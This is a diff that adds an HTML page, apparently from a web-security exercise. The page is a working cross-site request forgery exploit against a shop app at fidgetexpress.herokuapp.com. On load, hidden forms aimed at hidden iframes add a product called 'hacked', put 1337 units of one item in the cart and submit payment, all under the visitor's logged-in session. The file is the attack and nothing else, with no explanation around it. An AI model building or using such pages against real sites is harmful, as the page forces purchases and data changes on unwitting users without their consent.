@@ -1,0 +1,26 @@
+<body>
+  <iframe style="display: none" name="csrf-edit"></iframe>
+  <iframe style="display: none" name="csrf-buy-milk"></iframe>
+  <iframe style="display: none" name="csrf-pay"></iframe>
+
+  <form method="POST" action="http://fidgetexpress.herokuapp.com/edit.php" target="csrf-edit">
+    <input type="hidden" name="action" value="ADD">
+    <input type="hidden" name="name" value="hacked">
+    <input type="hidden" name="price" value="1337">
+  </form>
+  <form method="POST" action="http://fidgetexpress.herokuapp.com/store.php" target="csrf-buy-milk">
+    <input type="hidden" name="itemIds[1]" value="0">
+    <input type="hidden" name="itemIds[2]" value="0">
+    <input type="hidden" name="itemIds[3]" value="1337">
+    <input type="hidden" name="add">
+  </form>
+  <form method="POST" action="http://fidgetexpress.herokuapp.com/payment.php" target="csrf-pay">
+    <input type="hidden" name="pay">
+  </form>
+
+  <script>
+    document.forms[0].submit();
+    document.forms[1].submit();
+    document.forms[2].submit();
+  </script>
+</body>
